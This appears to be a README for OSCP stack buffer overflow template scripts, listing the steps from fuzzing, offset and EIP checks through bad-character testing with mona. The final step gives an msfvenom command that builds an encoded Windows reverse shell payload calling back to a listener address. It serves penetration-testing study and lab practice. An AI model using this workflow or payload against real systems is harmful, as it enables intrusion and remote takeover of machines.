# templates
Collection of template scripts



```oscp sbof```
1) fuzzer.py  # Find if you can overwrite EIP

2) offset.py # Workout your offset 
msf-pattern_create -l 1024 #200+ where your crash happened

3) eipconfirm.py # Confirm you have EIP overwrite

4) poonconf.py # See what registers you have write to e.g. ESP (Extended stack pointer)
!mona config -set workingfolder c:\mona\%p 

5) badchars.py # Test for badchars
!mona bytearray -cpb \x00\x0a 
!mona compare -a esp -f c:\mona\brainpan\bytearray.bin 

6) codeexec.py # Inject some int3's to check if you have "Code execution" int3 = breakpoints
#find jmp esp !mona jmp -r ESP 

7) getfukt.py # self explanitory 
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.91.129 LPORT=443 -b '\x00\x0a' -e x86/shikata_ga_nai -f python EXITFUNC=thread 
